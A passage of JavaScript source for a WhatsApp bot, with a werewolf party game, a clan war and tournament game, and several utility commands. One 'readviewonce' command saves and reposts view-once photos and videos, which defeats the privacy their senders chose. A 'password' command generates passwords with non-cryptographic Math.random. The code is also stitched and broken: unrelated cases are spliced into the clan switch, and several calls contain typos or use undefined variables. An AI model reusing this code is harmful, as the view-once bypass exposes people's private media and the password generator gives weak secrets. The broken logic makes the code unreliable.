    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    David.werewolf = David.werewolf ? David.werewolf : {};
    const ww = David.werewolf ? David.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return m.reply("Group is still in game session");
        if (playerOnGame(sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await m.reply("Room successfully created, type *.ww join* to join");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return m.reply("No game sessions yet");
        if (ww[chat].status === true)
            return m.reply("The game session has started");
        if (ww[chat].player.length > 16)
            return m.reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return m.reply("Sorry, the number of players is full.");
        if (playerOnGame(sender, ww) === true)
            return m.reply("You are still in a game session.");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nThe minimum number of players is 5 and the maximum is 15.";
        David.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return m.reply("No game sessions yet");
        if (ww[chat].player.length === 0)
            return m.reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return m.reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Room has no players yet");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(David. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(David. chat, ww);
            } else if (ww[chat].time === "evening") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(David. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return m.reply("The game session has started");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Only @${ww[chat].owner.split("@")[0]} can start a game.`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hi ${David.getName(
ww[chat].player[i].id
)}, You have been chosen to play the role of *Werewolf* ${emoji_role(
"werewolf"
)} in this game, please choose one of the players you want to eat tonight\n*LIST PLAYER*:\n${list2}\n\nType *.wwpc kill number* to kill the player`;
                    await David.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHi ${David.getName(
ww[chat].player[i].id
)} Your role is *Villager* ${emoji_role(
"resident"
)}, stay alert, maybe *Werewolf* will eat you tonight, please go to your respective houses.\n*LIST PLAYER*:\n${list1}`;
                    await David.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hi ${David.getName(
ww[chat].player[i].id
)} You have been chosen to be the *clairvoyant* ${emoji_role(
"seer"
)}. With the magic you have, you can find out the role of your chosen player.\n*LIST PLAYER*:\n${list1}\n\nType *.wwpc dreamy number* to see the role player`;

                    await David.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hi ${David.getName(
ww[chat].player[i].id
)} You have been chosen to play the role of *Guardian Angel* ${emoji_role(
"guardian"
)}, with the power you have, you can protect the citizens, please choose 1 player you want to protect\n*LIST PLAYER*:\n${list1}\n\nType *.wwpc deff number* to protect the player`;
  
                    await David.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hi ${David.getName(
ww[chat].player[i].id
)} You are chosen as the Sorcerer ${emoji_role(
"sorcerer"
)}, with the power you have, you can reveal the identities of the players, please select 1 person whose identity you want to reveal\n*LIST PLAYER*:\n${list2}\n\nType *.wwpc sorcerer number* to see the player role`;

                    await David.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await David.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nThe game has started, players will play their respective roles, please check your private chat to see your role. Be careful citizens, maybe tonight is your last night",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(David. chat, ww);
    } else      if (value === "kill") { 
    let byId = getPlayerById2(sender, parseInt(target), ww)
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return m.reply("This role is not for you");
if (byId.db.role === "sorcerer")
return m.reply("Cannot use skill for friend");
if (playerOnGame(sender, ww) === false)
return m.reply("You are not in a game session")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill has been used, skill can only be used once per night")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("You are dead")
if (!target || target.length < 1 || target.split('').length > 2)
return m.reply(`Enter player number \nExample: \n${prefix + command} kill 1`)
if (isNaN(target))
return m.reply("Use only numbers")
if (byId.db.isdead === true)
return m.reply("Player is dead")
if (byId.db.id === sender)
return m.reply("Cannot use skills for yourself")
    if (byId === false) 
        return m.reply("Player not registered")
m.reply("Successfully killed player " + parseInt(target))
.then(() => {
dataPlayer(sender, ww).status = true;
killWerewolf(sender, parseInt(target), ww);
});
} else if (value === "dreamy") {
if (dataPlayer(sender, ww).role !== "seer")
return m.reply("This role is not for you");
if (playerOnGame(sender, ww) === false)
return m.reply("You are not in a game session")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill has been used, skill can only be used once per night")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("You are dead")
if (!target || target.length < 1 || target.split('').length > 2)
return m.reply(`Enter player number \nExample: \n${prefix + command} kill 1`)
if (isNaN(target))
return m.reply("Use only numbers")
let byId = getPlayerById2(sender, parseInt(target), ww)
if (byId.db.isdead === true)
return m.reply("Player is dead")
if (byId.db.id === sender)
return m.reply("Cannot use skills for yourself")
if (byId === false)
return m.reply("Player is not registered")
let dreamy = dreamySeer(m.sender, parseInt(target), ww);
m.reply(`Successfully opened the identity of player ${target} is ${dreamy}`)
.then(() => {
dataPlayer(sender, ww).status = true;
});
} else if (value === "deff") {
if (dataPlayer(sender, ww).role !== "guardian")
return m.reply("This role is not for you"); if (playerOnGame(sender, ww) === false)
return m.reply("You are not in a game session")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill has been used, skill can only be used once per night")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("You are dead")
if (!target || target.length < 1 || target.split('').length > 2)
return m.reply(`Enter player number \nExample: \n${prefix + command} kill 1`)
if (isNaN(target))
return m.reply("Use only numbers")
let byId = getPlayerById2(sender, parseInt(target), ww)
if (byId.db.isdead === true)
return m.reply("Player is dead")
if (byId.db.id === sender)
return m.reply("Cannot use skill for self")
if (byId === false)
return m.reply("Player is not registered")
m.reply(`Successfully protected player ${target}`).then(() => {
protectGuardian(m.sender, parseInt(target), ww);
dataPlayer(sender, ww).status = true;
});
} else if (value === "sorcerer") {
if (dataPlayer(sender, ww).role !== "sorcerer")
return m.reply("This role is not for you"); 
             if (playerOnGame(sender, ww) === false)
        return m.reply("You are not in a game session")
if (dataPlayer(sender, ww).status === true)
return m.reply("Skill has been used, skill can only be used once per night")
if (dataPlayer(sender, ww).isdead === true)
return m.reply("You are dead")
if (!target || target.length < 1 || target.split('').length > 2)
return m.reply(`Enter player number \nExample: \n${prefix + command} kill 1`)
if (isNaN(target))
return m.reply("Use only numbers")
let byId = getPlayerById2(sender, parseInt(target), ww)
if (byId.db.isdead === true)
return m.reply("Player is dead")
if (byId.db.id === sender)
return m.reply("Cannot use skill for self")
if (byId === false)
return m.reply("Player is not registered")
let sorker = sorcerer(session(m.sender), target);
m.reply(`Successfully opened the identity of player ${player} is ${sorker}`)
.then(() => {
dataPlayer(sender, ww).status = true;
});
} else if (value === "vote") {
if (!ww[chat]) return m.reply("There is no game session yet");
if (ww[chat].status === false)
return m.reply("Game session has not started");
if (ww[chat].time !== "voting")
return m.reply("Voting session has not started");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("You are not a player");
if (dataPlayer(sender, ww).isdead === true)
return m.reply("You are dead");
if (!target || target.length < 1)
return m.reply("Enter player number");
if (isNaN(target)) return m.reply("Use only number");
if (dataPlayer(sender, ww).isvote === true)
return m.reply("You have voted");
b = getPlayerById(chat, sender, parseInt(target), ww);
if (b.db.isdead === true)
return m.reply(`Player ${target} is dead.`);
if (ww[chat].player.length < parseInt(target))
return m.reply("Invalid");
if (getPlayerById(chat, sender, parseInt(target), ww) === false)
return m.reply("Player is not registered!");
vote(chat, parseInt(target), sender, ww);
return m.reply("✅ Vote");
} else if (value == "exit") {
if (!ww[chat]) return m.reply("No game session");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("You are not in a game session");
if (ww[chat].status === true)
return m.reply("The game has started, you can't leave");
let exitww = `${sender.split("@")[0]} Exit the game`
                David.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return m.reply("No game sessions");
if (ww[chat].owner !== sender)
return m.reply(
`Only @${
ww[chat].owner.split("@")[0]
} can delete this game session`
);
m.reply("Game session successfully deleted").then(() => {
delete ww[chat];
});
} else if (value === "player") {
if (!ww[chat]) return m.reply("No game sessions");
if (playerOnRoom(sender, chat, ww) === false)
return m.reply("You are not in a game session");
if (ww[chat].player.length === 0)
return m.reply("Game session does not have any players yet");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        David.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
    let text = `\n*⌂ W E R E W O L F - G A M E*\n\nA social game that takes place in several rounds. Players are required to find a criminal in the game. Players are given time, roles, and their respective abilities to play this game.\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nThis game can be played by 5 to 15 people..`;
        David.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
case "clan":
  case "clans":
    {
      if (!m.isGroup) return m.reply(mess.OnlyGrup);
      let jimp = require("jimp");
      const resizeImage = async (image, width, height) => {
        const readImage = await jimp.read(image);
        const resizedImage = await readImage
          .resize(width, height)
          .getBufferAsync(jimp.MIME_JPEG);
        return resizedImage;
      };

      let thumbUrl = "https://telegra.ph/file/048d31385faac531d20c6.jpg";
      const {
        playerOnClan,
        readClans,
        writeClans,
        setMissions,
        upgradeMissonProgress,
        updateClanTaskProgress,
        upgradeClanLevel,
        simulateWinner,
        getClanData,
        saveClanData,
        saveTournamentData,
      } = require("./lib/clan");

      async function startNextMatch(tournament) {
        let nextMatch = tournament.matches.find(
          (match) => match.status === "pending",
        );
        if (!nextMatch) {
          tournament.status = "completed";
          clans.currentTournament = null;

          let winnerClan = tournament.participants[0];
          let winningClanData = await getClanData(winnerClan);

          winningClanData.power += 1000;
          winningClanData.level += 5;

          saveClanData(winnerClan, winningClanData);

          await m.reply(
            `The tournament ${tournament.name} is over! The winner is ${winnerClan}. This clan receives 1000 power and advances 5 levels.`,
          );
          return;
        }

        let clan1Data = await getClanData(nextMatch.clan1);
        let clan2Data = await getClanData(nextMatch.clan2);

        nextMatch.status = "ongoing";
        writeClans(clans);

        let winner = simulateWinner(clan1Data, clan2Data);
        nextMatch.winner = winner;
        nextMatch.status = "completed";

        tournament.participants = tournament.participants.filter(
          (clan) =>
            clan !==
            (winner === clan1Data.clan ? clan2Data.clan : clan1Data.clan),
        );

        writeClans(clans);

        await m.reply(
          `The match between ${clan1Data.clan} and ${clan2Data.clan} is over! The winner is ${winner}.`,
        );

        setTimeout(() => startNextMatch(tournament), 5000);
      }

      const { sender, chat } = m;
      const clans = readClans();
      const clanData = clans[chat];
      const action = args[0];
      const param1 = args[1];
      const param2 = args[2];

      switch (action) {
        case "create":
          let existingUserClan = Object.values(clans).find(
            (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
          );
          if (existingUserClan) return m.reply("You already have a clan.");
          let createText = `*Hooray, Clan created successfully*`;
          clans[param1] = {
            room: param1,
            owner: sender.replace("@s.whatsapp.net", ""),
            status: false,
            clan: param1,
            members: [],
            joinRequests: [],
            level: 1,
            warLimit: 5,
            currentWarCount: 0,
            missions: {
              daily: {
                description: "Recruit 5 new members",
                progress: 0,
                target: 5,
                reward: 100,
              },
              weekly: {
                description: "Win 3 wars",
                progress: 0,
                target: 3,
                reward: 500,
              },
            },
            clanTasks: {
              description: "Reach level 3",
              progress: 1,
              target: 3,
              reward: 300,
            },
          };
          createText += `\n\nTo join clans, please type .clan join your clan name.`;
          writeClans(clans);
          await m.reply(createText.trim());
          break;

        case "join":
          if (!param1)
            return m.reply(
              "Please enter the name of the clan you want to join.",
            );

          let userClanCheck = Object.values(clans).find(
            (c) => c.members && c.members.some((m) => m.id === sender),
          );
          if (userClanCheck)
            return m.reply("You are already part of another clan.");

          let targetJoinClan = Object.values(clans).find(
            (c) => c.clan === param1,
          );
          if (!targetJoinClan)
            return m.reply("The clan you want to join was not found.");
          if (playerOnClan(sender, chat, clans) === true)
            return m.reply("You are already part of this clan.");

          let joinData = {
            id: sender,
            number: targetJoinClan.members
              ? targetJoinClan.members.length + 1
              : 1,
            session: chat,
            status: false,
            clan: param1,
            vote: 0,
            isVote: false,
          };

          if (!targetJoinClan.joinRequests) {
            targetJoinClan.joinRequests = [];
          }

          targetJoinClan.joinRequests.push(joinData);
          writeClans(clans);

          let joinText = `Join request has been sent to clan ${targetJoinClan.clan}. Await approval from the clan leader.`;
          m.reply(joinText);
          break;

        case "approve":
          if (!param1)
            return m.reply(
              "Please enter the name of the clan you want to view.",
            );
          let approveClan = Object.values(clans).find(
            (c) => c.clan === param1,
          );
          if (!approveClan) return m.reply("Clan not found.");

          if (approveClan.owner !== sender.replace("@s.whatsapp.net", ""))
            return m.reply(
              "You do not have permission to approve join requests.",
            );

          if (
            !approveClan.joinRequests ||
            approveClan.joinRequests.length === 0
          )
            return m.reply(
              "There are no join requests pending approval.",
            );

              let approveText = "";

              if (param2 === "all") {
                let approvedMembers = [];
                approveClan.joinRequests.forEach((request) => {
                  targetJoinClan.members.push({
                    id: request.id,
                    number: approveClan.members.length + 1,
                    sesi: chat,
                    status: false,
                    clan: request.clan,
                    vote: 0,
                  });
                  approvedMembers.push(request.id);
approveText += `Join request from @${request.id.replace("@s.whatsapp.net", "")} has been approved.\n`;
});
approveClan.joinRequests = [];
writeClans(clans);
} else if (param2) {
  let index = parseInt(param2) - 1;
  if (
    isNaN(index) ||
    index < 0 ||
    index >= approveClan.joinRequests.length
  )
    return m.reply("Invalid index number.");

  let requester = approveClan.joinRequests[index];
  approveClan.joinRequests.splice(index, 1);
  approveClan.members.push({
    id: requester.id,
    number: approveClan.members.length + 1,
    session: chat,
    status: false,
    clan: requester.clan,
    vote: 0,
  });
  approveText = `Join request from @${requester.id.replace("@s.whatsapp.net", "")} has been approved.`;
  writeClans(clans);
} else {
  let pendingRequestsText = `Please specify whether you want to approve all join requests (all) or a specific user's request.\n\n`;
  pendingRequestsText += "*List of Join Requests:*\n";
  approveClan.joinRequests.forEach((request, index) => {
    pendingRequestsText += `${index + 1}. @${request.id.replace("@s.whatsapp.net", "")}\n`;
  });

  pendingRequestsText +=
    "\nTo approve a specific request, use the command '.clan approve [index number]'";
  return m.reply(pendingRequestsText.trim());
}

await m.reply(approveText);
break;






case 'vv': case 'readviewonce': {
if (!m?.quoted) return reply('reply the image/video you want to see')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message..')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return David.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return David.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case 'autoreact': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoreact = true
await reply('SucessFully Activated AutoReact.')
} else if (args[0] === 'off') {
global.autoreact = false
await reply('SucessFully Deactivated AutoReact.')
}}
break             






case "war":
  let warInitiatorClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!warInitiatorClan)
    return m.reply("You do not have a clan to start a war.");

  if (warInitiatorClan.currentWarCount >= warInitiatorClan.warLimit)
    return m.reply(
      `Your daily war limit has been reached (${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}).`,
    );

  let warTargetClan = Object.values(clans).filter(
    (c) => c.clan !== warInitiatorClan.clan,
  );
  if (warTargetClan.length === 0)
    return m.reply(
      "No other clans found for war.",
    );

  warTargetClan =
    warTargetClan[Math.floor(Math.random() * warTargetClan.length)];

  if (warInitiatorClan.war || warTargetClan.war)
    return m.reply(
      "One or both clans are currently in a state of war.",
    );

  let initiatorPower =
    warInitiatorClan.level * warInitiatorClan.members.length;
  let targetPower =
    warTargetClan.level * warTargetClan.members.length;
  let winnerClan =
    initiatorPower >= targetPower
      ? warInitiatorClan
      : warTargetClan;
  let loserClan =
    initiatorPower < targetPower ? warInitiatorClan : warTargetClan;
  let warReward = Math.floor(Math.random() * 3) + 1;

  winnerClan.level += 1; 
  winnerClan.warLimit += warReward;
  winnerClan.currentWarCount += 1;
  loserClan.currentWarCount += 1;

  if (winnerClan.missions && winnerClan.missions.daily) {
    if (
      winnerClan.missions.daily.description.includes("Reach level")
    ) {
      winnerClan.missions.daily.progress = winnerClan.level;
      if (
        winnerClan.missions.daily.progress >=
        winnerClan.missions.daily.target
      ) {
        winnerClan.warLimit += winnerClan.missions.daily.reward;
        winnerClan.missions.daily.completed = true;
      }
    }
  }

  if (winnerClan.missions && winnerClan.missions.weekly) {
    if (
      winnerClan.missions.weekly.description.includes("Reach level")
    ) {
      winnerClan.missions.weekly.progress = winnerClan.level;
      if (
        winnerClan.missions.weekly.progress >=
        winnerClan.missions.weekly.target
      ) {
        winnerClan.warLimit += winnerClan.missions.weekly.reward;
        winnerClan.missions.weekly.completed = true;
      }
    }
  }

  let warResultText = `*War Result:*\n\n`;
  warResultText += `Winner: ${winnerClan.clan} (Level ${winnerClan.level})\n`;
  warResultText += `Loser: ${loserClan.clan} (Level ${loserClan.level})\n`;
  warResultText += `Clan ${winnerClan.clan} receives an additional war limit reward of ${warReward}.\n\n`;
  warResultText += `Daily war count for ${warInitiatorClan.clan}: ${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}`;
  writeClans(clans);
  await m.reply(warResultText.trim());
  break;

case "list":
  let listText = `*List of Clans:*\n\n`;
  for (let clanKey in clans) {
    if (
      clanKey === "tournaments" ||
      clanKey === "currentTournament"
    )
      continue;

    let clan = clans[clanKey];
    if (clan && clan.members) {
      let warLimitDisplay =
        clan.warLimit !== null && clan.warLimit !== undefined
          ? clan.warLimit
          : 3;
      listText += `Clan Name: ${clan.clan}\n`;
      listText += `Level: ${clan.level}\n`;
      listText += `Number of Members: ${clan.members.length}\n`;
      listText += `Daily War Limit: ${clan.currentWarCount}/${warLimitDisplay}\n\n`;
    }
  }
  await m.reply(listText.trim());
  break;

case "leave":
  let userClan = Object.values(clans).find(
    (c) => c.members && c.members.some((m) => m.id === sender),
  );
  if (!userClan)
    return m.reply("You are not part of any clan.");

  userClan.members = userClan.members.filter(
    (m) => m.id !== sender,
  );
  writeClans(clans);
  await m.reply(`You have left the clan ${userClan.clan}.`);
  break;
  
case 'password':
    const length = parseInt(args[0]) || 12;
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
    let password = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    reply(`*Generated Password:* ${password}`);
    break;
	
        case 'mood':
    const currentHour = new Date().getHours();
    let mood = '';

    if (currentHour < 6) {
        mood = 'Sleepy 😴';
    } else if (currentHour < 12) {
        mood = 'Energetic ☀️';
    } else if (currentHour < 18) {
        mood = 'Productive 💼';
    } else {
        mood = 'Relaxed 🌙';
    }

    reply(`Your mood is: ${mood}`);
    break;  
  

case "delete":
  let deleteClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!deleteClan)
    return m.reply("You do not have a clan to delete.");

  delete clans[deleteClan.clan];
  writeClans(clans);
  await m.reply(`Clan ${deleteClan.clan} has been deleted.`);
  break;

case "member":
  let targetClanMember = Object.values(clans).find(
    (c) => c.clan === param1,
  );
  if (!targetClanMember)
    return m.reply("The clan you are looking for was not found.");

  let memberText = `*List of Members in Clan ${targetClanMember.clan}:*\n\n`;
  targetClanMember.members.forEach((member, index) => {
    memberText += `${index + 1}. @${member.id.replace("@s.whatsapp.net", "")}\n`;
  });
  await m.reply(memberText.trim());
  break;

case "missions":
  let missionsClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!missionsClan)
    return m.reply("You do not have a clan to view missions.");

  let missionsText = `*Clan ${missionsClan.clan} Missions:*\n\n`;
  if (missionsClan.missions && missionsClan.missions.daily) {
    missionsText += `Daily Mission: ${missionsClan.missions.daily.description}\n`;
    missionsText += `Progress: ${missionsClan.missions.daily.progress}/${missionsClan.missions.daily.target}\n`;
    missionsText += `Reward: ${missionsClan.missions.daily.reward}\n\n`;
  }
  if (missionsClan.missions && missionsClan.missions.weekly) {
    missionsText += `Weekly Mission: ${missionsClan.missions.weekly.description}\n`;
    missionsText += `Progress: ${missionsClan.missions.weekly.progress}/${missionsClan.missions.weekly.target}\n`;
    missionsText += `Reward: ${missionsClan.missions.weekly.reward}\n\n`;
  }
  await m.reply(missionsText.trim());
  break;

case "task":
  let taskClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!taskClan)
    return m.reply("You do not have a clan to view tasks.");

  let taskText = `*Clan ${taskClan.clan} Tasks:*\n\n`;
  if (taskClan.clanTasks) {
    taskText += `Task Description: ${taskClan.clanTasks.description}\n`;
    taskText += `Progress: ${taskClan.clanTasks.progress}/${taskClan.clanTasks.target}\n`;
    taskText += `Reward: ${taskClan.clanTasks.reward}\n`;
  } else {
taskText += "No tasks currently.";
}
await m.reply(taskText.trim());
break;

case "upgrade":
  let upgradeClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!upgradeClan)
    return m.reply(
      "You do not have a clan to upgrade.",
    );

  let upgradeCost = upgradeClan.level * 1000; // *☘️ Example :* upgrade cost based on clan level
  if (upgradeClan.level < upgradeClan.clanTasks.target) {
    upgradeClan.level += 1;
    upgradeClan.clanTasks.progress += 1;
    writeClans(clans);
    await m.reply(
      `Clan ${upgradeClan.clan} has been successfully upgraded to level ${upgradeClan.level}.`,
    );
  } else {
    await m.reply(
      "Your clan has already reached the maximum level for the current task.",
    );
  }
  break;

case "tournament":
  const subAction = param1;

  switch (subAction) {
    case "create":
      if (!param2)
        return m.reply(
          "Please enter the name of the tournament you want to create.",
        );

      let tournamentName = param2;
      if (!clans.tournaments) {
        clans.tournaments = {};
      }

      if (clans.currentTournament)
        return m.reply(
          "A tournament is currently ongoing. Please wait until the current tournament is over.",
        );

      if (clans.tournaments[tournamentName])
        return m.reply("A tournament with that name already exists.");

      clans.currentTournament = tournamentName;

      clans.tournaments[tournamentName] = {
        name: tournamentName,
        participants: [],
        status: "pending",
        matches: [],
      };

      writeClans(clans);
      await m.reply(`Tournament ${tournamentName} has been successfully created.`);
      break;

    case "join":
      let currentTournamentName = clans.currentTournament;
      if (!currentTournamentName)
        return m.reply("No tournament is currently ongoing.");

      let joinTournament = clans.tournaments[currentTournamentName];

      let joinUserClan = Object.values(clans).find(
        (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
      );
      if (!joinUserClan)
        return m.reply(
          "You do not have a clan to join the tournament.",
        );

      if (joinTournament.participants.includes(joinUserClan.clan))
        return m.reply("Your clan is already registered for this tournament.");

      joinTournament.participants.push(joinUserClan.clan);
      writeClans(clans);
      await m.reply(
        `Clan ${joinUserClan.clan} has been successfully registered for the ${currentTournamentName} tournament.`,
      );
      break;

    case "start":
      let startTournamentName = clans.currentTournament;
      if (!startTournamentName)
        return m.reply("No tournament is currently ongoing.");

      let startTournament = clans.tournaments[startTournamentName];

      if (startTournament.status !== "pending")
        return m.reply("The tournament has already started or ended.");

      if (
        startTournament.participants.length < 2 ||
        startTournament.participants.length % 2 !== 0
      ) {
        return m.reply(
          "The number of tournament participants must be even and at least 2 clans to start.",
        );
      }

      startTournament.participants =
        startTournament.participants.sort(
          () => Math.random() - 0.5,
        );

      while (startTournament.participants.length > 1) {
        for (
          let i = 0;
          i < startTournament.participants.length;
          i += 2
        ) {
          if (startTournament.participants[i + 1]) {
            startTournament.matches.push({
              clan1: startTournament.participants[i],
              clan2: startTournament.participants[i + 1],
              status: "pending",
            });
          }
        }
        startTournament.participants =
          startTournament.participants.filter(
            (_, index) => index % 2 === 0,
          );
      }

      startTournament.status = "ongoing";
      clans.currentTournament = startTournamentName;
      writeClans(clans);

      await m.reply(`Tournament ${startTournamentName} has started!`);

      startNextMatch(startTournament);
      break;

    case "status":
      let statusTournamentName = clans.currentTournament;
      if (!statusTournamentName)
        return m.reply("No tournament is currently ongoing.");

